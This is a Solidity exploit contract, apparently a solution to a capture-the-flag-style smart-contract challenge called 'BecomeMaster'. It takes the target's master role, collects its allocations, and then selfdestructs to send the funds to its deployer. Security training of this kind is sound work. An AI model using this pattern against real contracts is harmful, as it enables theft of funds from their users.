// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.11;

import {N5BecomeMaster} from "../N5-BecomeMaster-medium.sol";

contract N5ExploitHack {
  address payable private owner;

  error NotOwner();

  constructor() {
    owner = payable(msg.sender);
  }

  function finalize(N5BecomeMaster _becomeMaster) external {
    N5BecomeMaster becomeMaster = _becomeMaster;
    becomeMaster.takeMasterRole();
    becomeMaster.collectAllocations();
  }

  // After successful hack remove all bytecode from this contract and send all funds to Owner
  function withdraw() external {
    if (msg.sender != owner) {
      revert NotOwner();
    }

    selfdestruct(owner);
  }

  receive() external payable {}
}
